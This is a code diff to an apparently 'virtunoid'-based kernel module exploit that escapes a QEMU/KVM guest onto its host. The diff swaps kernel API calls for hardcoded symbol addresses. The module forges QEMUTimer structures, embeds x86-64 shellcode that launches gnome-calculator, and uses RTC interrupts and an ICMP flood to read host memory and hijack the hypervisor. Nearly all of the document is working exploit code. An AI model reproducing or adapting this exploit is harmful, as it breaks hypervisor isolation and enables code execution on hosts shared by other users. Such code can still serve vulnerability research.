@@ -27,7 +27,6 @@
 
 #include "virtunoid-config.h"
 #define QEMU_GATEWAY  0x0202000a //"10.0.2.2"
-//#define QEMU_GATEWAY  0x017aa8c0//"192.168.122.1"
 
 #include <stdarg.h>
 #include <linux/rtc.h>
@@ -58,10 +57,33 @@ typedef void    *gva_t;
 /* function pointer address in System.map */
 #define PRINTK 0xffffffff8130acce // printk
 #define SNPRINTF 0xffffffff8116a3f0 // snprintf
+#define KMALLOC 0xffffffff8109d6d0 // __kmalloc
+#define FILP_OPEN 0xffffffff8109ea20 // filp_open
+#define FILP_CLOSE 0xffffffff8109e880 // filp_close
+#define VFS_READ 0xffffffff810a0950 // vfs_read
+#define PHYS_ADDR 0xffffffff8101ed00 // __phys_addr
+#define UDELAY 0xffffffff8116aa90 // __udelay
+#define RTC_IRQ 0xffffffff81237c40 // rtc_update_irq_enable
+#define SOCK_CREATE 0xffffffff81243520 // sock_create
+#define SOCK_SENDMSG 0xffffffff81242a40 // sock_sendmsg
+#define SOCK_RELEASE 0xffffffff81243240 // sock_release
+#define MEMCPY 0xffffffff8116b440 // memcpy
+#define KERNEL_STACK 0xffffffff8161a048 // kernel_stack
 
 /* function prototype */
-int p_printk(const char *fmt, ...);
-int p_snprintf(char *s, size_t n, const char *fmt, ...);
+int fp_printk(const char *fmt, ...);
+int fp_snprintf(char *s, size_t n, const char *fmt, ...);
+void *fp_kmalloc(size_t size, gfp_t flags);
+struct file *fp_filp_open(const char *filename, int flags, umode_t mode);
+int fp_filp_close(struct file *, fl_owner_t id);
+ssize_t fp_vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos);
+unsigned long fp_phys_addr(unsigned long x);
+void fp_udelay(unsigned long usecs);
+int fp_rtc_update_irq_enable(struct rtc_device *rtc, unsigned int enabled);
+int fp_sock_create(int family, int type, int protocol, struct socket **res);
+int fp_sock_sendmsg(struct socket *sock, struct msghdr *msg, size_t size);
+void fp_sock_release(struct socket *sock);
+void *fp_memcpy(void *dstpp, const void *srcpp, size_t len);
 
 //////////////////////////////////
 #include <asm/mman.h>
@@ -75,7 +97,7 @@ int execv(const char *path, char *const argv[]);
 int assert(int val){
     if(val != 1){
         char assert_msg[] = "Assert fail.\n";
-        ((typeof(p_printk)*)PRINTK)(assert_msg);
+        ((typeof(fp_printk)*)PRINTK)(assert_msg);
         return -1;
     }
     return 0;
@@ -95,7 +117,7 @@ struct file* file_open(const char* path, int flags, int rights) {
 
     oldfs = get_fs();
     set_fs(get_ds());
-    filp = filp_open(path, flags, rights);
+    filp = ((typeof(fp_filp_open)*)FILP_OPEN)(path, flags, rights);
     set_fs(oldfs);
     if(IS_ERR(filp)) {
         err = PTR_ERR(filp);
@@ -106,7 +128,7 @@ struct file* file_open(const char* path, int flags, int rights) {
 
 /* Close a file (similar to close) */
 void file_close(struct file* file) {
-    filp_close(file, NULL);
+    ((typeof(fp_filp_close)*)FILP_CLOSE)(file, NULL);
 }
 
 /* Reading data from a file (similar to pread) */
@@ -117,10 +139,10 @@ int file_read(struct file* file, unsigned long long offset, unsigned char* data,
     oldfs = get_fs();
     set_fs(get_ds());
 
-    ret = vfs_read(file, data, size, &offset);
+    ret = ((typeof(fp_vfs_read)*)VFS_READ)(file, data, size, &offset);
     if (offset != 0){
         char print_msg[] = "Offset is not 0.\n";
-        ((typeof(p_printk)*)PRINTK)(print_msg);
+        ((typeof(fp_printk)*)PRINTK)(print_msg);
     }
     set_fs(oldfs);
     return ret;
@@ -198,11 +220,6 @@ struct QEMUTimer {
 };
 
 struct IORangeOps {
-    /*    void (*read)(IORange *iorange, uint64_t offset, unsigned width,
-              uint64_t *data);
-          void (*write)(IORange *iorange, uint64_t offset, unsigned width,
-              uint64_t data);
-    */
     hva_t read;
     hva_t write;
 };
@@ -314,7 +331,7 @@ uint32_t addr_page_offset(unsigned long addr) {
 }
 
 gpa_t gva_to_gpa(gva_t addr) {
-    unsigned long paddr = virt_to_phys(addr);
+    unsigned long paddr = ((typeof(fp_phys_addr)*)PHYS_ADDR)((unsigned long)addr);
     return paddr;
 }
 
@@ -340,7 +357,6 @@ hva_t gva_to_hva(struct target_region targets[], gva_t addr, hva_t highmem_hva_b
  */
 
 struct shared_state {
-    char prog[32];
     hva_t shellcode;
     int done;
 };
@@ -401,15 +417,15 @@ struct QEMUTimer *construct_payload(struct target_region targets[], struct share
 \x48\x83\xc4\x20\
 \x5d\
 \xc3/usr/bin/gnome-calculator";
-    ((typeof(p_printk)*)PRINTK)(sc);
+    ((typeof(fp_printk)*)PRINTK)(sc);
     len = strlen(sc)+1;
 
-    ops = kmalloc(sizeof *ops,GFP_ATOMIC);
+    ops = ((typeof(fp_kmalloc)*)KMALLOC)(sizeof *ops,GFP_ATOMIC);
 
     ops->read = MPROTECT;
     ops->write = 0;
 
-    ioport = (struct IORange*) kmalloc(3*PAGE_SIZE,GFP_ATOMIC);
+    ioport = (struct IORange*) ((typeof(fp_kmalloc)*)KMALLOC)(3*PAGE_SIZE,GFP_ATOMIC);
 
     mask = (long unsigned int)ioport;
 
@@ -425,7 +441,7 @@ struct QEMUTimer *construct_payload(struct target_region targets[], struct share
 
     share.shellcode = gva_to_hva(targets, ioport, highmem_hva_base);
 
-    memcpy(ioport + 1, sc, len);
+    ((typeof(memcpy)*)MEMCPY)(ioport + 1, sc, len);
     ptr8 = (uint8_t*)(ioport+1);
     ptr8 += len;
     ptr32 = (uint32_t*)ptr8;
@@ -438,7 +454,7 @@ struct QEMUTimer *construct_payload(struct target_region targets[], struct share
     timer = fake_timer(targets, IOPORT_READL_THUNK, gva_to_hva(targets, ioport, highmem_hva_base), timer, highmem_hva_base);
     timer = fake_timer(targets, CPU_OUTL, 0, timer, highmem_hva_base);//0x5e155e
 
-    ((typeof(p_printk)*)PRINTK)(leave_msg);
+    ((typeof(fp_printk)*)PRINTK)(leave_msg);
     return timer;
 }
 
@@ -477,7 +493,7 @@ uint64_t read_host8(struct target_region targets[], struct QEMUTimer *head, stru
     *hi = (uint32_t)-1;
     commit_targets(targets, fake_rtc);
     while (*hi == (uint32_t)-1) {
-        mdelay(1000);
+        ((typeof(fp_udelay)*)UDELAY)(1001);
         refresh_targets(targets);
     }
     val = ((uint64_t)*hi << 32) | (uint64_t)*low;
@@ -506,29 +522,21 @@ void wait_rtc(void) {
     char dev_rtc[] = "/dev/rtc";
     char die_msg[] = "error: wait_rtc.\n";
     if ((fd = file_open(dev_rtc, O_RDONLY, 0)) == NULL){
-        ((typeof(p_printk)*)PRINTK)(die_msg);
+        ((typeof(fp_printk)*)PRINTK)(die_msg);
     }
     rtc = fd->private_data;
-    if (rtc_update_irq_enable(rtc, 1) < 0){
-        ((typeof(p_printk)*)PRINTK)(die_msg);
+    if (((typeof(fp_rtc_update_irq_enable)*)RTC_IRQ)(rtc, 1) < 0){
+        ((typeof(fp_printk)*)PRINTK)(die_msg);
     }
     if (file_read(fd, 0, (unsigned char *)&val, sizeof val) != sizeof(val)){
-        ((typeof(p_printk)*)PRINTK)(die_msg);
+        ((typeof(fp_printk)*)PRINTK)(die_msg);
     }
-    if (rtc_update_irq_enable(rtc, 0) < 0){
-        ((typeof(p_printk)*)PRINTK)(die_msg);
+    if (((typeof(fp_rtc_update_irq_enable)*)RTC_IRQ)(rtc, 0) < 0){
+        ((typeof(fp_printk)*)PRINTK)(die_msg);
     }
     file_close(fd);
     outb(10,   0x70);
     outb(0xF0, 0x71);
-}
-
-/* use to set the prog in share */
-struct shared_state set_share(void){
-    char g_calc[] = "/usr/bin/gnome-calculator";
-    struct shared_state share;
-    snprintf(share.prog, sizeof(share.prog), g_calc);
-    return share;
 }
 
 struct debug_msg {
@@ -540,17 +548,8 @@ struct debug_msg {
     char exit_msg[32];
 };
 
+/* use char[] to avoid using .rodata section */
 struct debug_msg set_msgs(void){
-/*
-    char full_msg[] = "0123456789";
-    struct debug_msg msgs;
-    snprintf(msgs.enter_msg, sizeof(msgs.enter_msg), full_msg);
-    snprintf(msgs.socket_msg, sizeof(msgs.socket_msg), full_msg);
-    snprintf(msgs.wait_msg, sizeof(msgs.wait_msg), full_msg);
-    snprintf(msgs.hotplug_msg, sizeof(msgs.hotplug_msg), full_msg);
-    snprintf(msgs.done_msg, sizeof(msgs.done_msg), full_msg);
-    snprintf(msgs.exit_msg, sizeof(msgs.exit_msg), full_msg);
-*/
     char enter_msg[] = "ENTER MODULE.\n";
     char socket_msg[] = "Constructing socket...\n";
     char wait_msg[] = "Waiting for RTC interrupt...\n";
@@ -558,12 +557,12 @@ struct debug_msg set_msgs(void){
     char done_msg[] = "Done!\n";
     char exit_msg[] = "EXIT MODULE.\n";
     struct debug_msg msgs;
-    snprintf(msgs.enter_msg, sizeof(msgs.enter_msg), enter_msg);
-    snprintf(msgs.socket_msg, sizeof(msgs.socket_msg), socket_msg);
-    snprintf(msgs.wait_msg, sizeof(msgs.wait_msg), wait_msg);
-    snprintf(msgs.hotplug_msg, sizeof(msgs.hotplug_msg), hotplug_msg);
-    snprintf(msgs.done_msg, sizeof(msgs.done_msg), done_msg);
-    snprintf(msgs.exit_msg, sizeof(msgs.exit_msg), exit_msg);
+    ((typeof(fp_snprintf)*)SNPRINTF)(msgs.enter_msg, sizeof(msgs.enter_msg), enter_msg);
+    ((typeof(fp_snprintf)*)SNPRINTF)(msgs.socket_msg, sizeof(msgs.socket_msg), socket_msg);
+    ((typeof(fp_snprintf)*)SNPRINTF)(msgs.wait_msg, sizeof(msgs.wait_msg), wait_msg);
+    ((typeof(fp_snprintf)*)SNPRINTF)(msgs.hotplug_msg, sizeof(msgs.hotplug_msg), hotplug_msg);
+    ((typeof(fp_snprintf)*)SNPRINTF)(msgs.done_msg, sizeof(msgs.done_msg), done_msg);
+    ((typeof(fp_snprintf)*)SNPRINTF)(msgs.exit_msg, sizeof(msgs.exit_msg), exit_msg);
 
     return msgs;
 }
@@ -588,7 +587,7 @@ static int __init server_init( void ){
         { 0, 0, 0, 0}
     };
 
-    struct shared_state share = set_share();
+    struct shared_state share;
     struct debug_msg msgs = set_msgs();
 
     int i;
@@ -605,7 +604,7 @@ static int __init server_init( void ){
     struct iovec iov;
     struct socket *sock;
 
-    int ret = sock_create(AF_INET, SOCK_RAW, IPPROTO_ICMP, &sock);
+    int ret = ((typeof(sock_create)*)SOCK_CREATE)(AF_INET, SOCK_RAW, IPPROTO_ICMP, &sock);
     struct msghdr msg = { &dest, sizeof(dest),
               &iov, 1, &cmsg, 0, 0 };
 
@@ -616,7 +615,7 @@ static int __init server_init( void ){
         return -1;
     }
 
-    ((typeof(p_printk)*)PRINTK)(msgs.enter_msg);
+    ((typeof(fp_printk)*)PRINTK)(msgs.enter_msg);
 
     oldfs = get_fs();
     set_fs(get_ds());
@@ -646,7 +645,7 @@ static int __init server_init( void ){
 
     commit_targets(targets, fake_rtc);
 
-    ((typeof(p_printk)*)PRINTK)(msgs.socket_msg);
+    ((typeof(fp_printk)*)PRINTK)(msgs.socket_msg);
 
     /* fillout sockaddr_in-structure whereto */
     memset(&dest, 0, sizeof(dest));
@@ -665,22 +664,22 @@ static int __init server_init( void ){
     /* calculate icmp-checksum */
     icmp->checksum = in_cksum((void*)&packet, len, 0);
 
-    ((typeof(p_printk)*)PRINTK)(msgs.wait_msg);
+    ((typeof(fp_printk)*)PRINTK)(msgs.wait_msg);
 
     wait_rtc();
 
     outl(2, PORT);
 
-    ((typeof(p_printk)*)PRINTK)(msgs.hotplug_msg);
+    ((typeof(fp_printk)*)PRINTK)(msgs.hotplug_msg);
 
     i = 0;
     while (timer->expire_time == 0) {
-        sock_sendmsg(sock, &msg, len);
+        ((typeof(sock_sendmsg)*)SOCK_SENDMSG)(sock, &msg, len);
         if (++i % 1000 == 0){
             refresh_targets(targets);
         }
     }
-    sock_release(sock);
+    ((typeof(sock_release)*)SOCK_RELEASE)(sock);
     sock = NULL;
 
     ram_block = read_host8(targets, timer, timer2, ADDR_RAMLIST_FIRST, fake_rtc, highmem_hva_base);
@@ -692,16 +691,16 @@ static int __init server_init( void ){
     commit_targets(targets, fake_rtc);
 
     while (!share.done)
-	mdelay(1000);
+	((typeof(fp_udelay)*)UDELAY)(1000);
 
-    ((typeof(p_printk)*)PRINTK)(msgs.done_msg);
+    ((typeof(fp_printk)*)PRINTK)(msgs.done_msg);
 
     return 0;
 }
 
 static void __exit server_exit( void )
 {
-    //((typeof(p_printk)*)PRINTK)(msgs.exit_msg);
+    //((typeof(fp_printk)*)PRINTK)(msgs.exit_msg);
 }
 
 module_init(server_init);
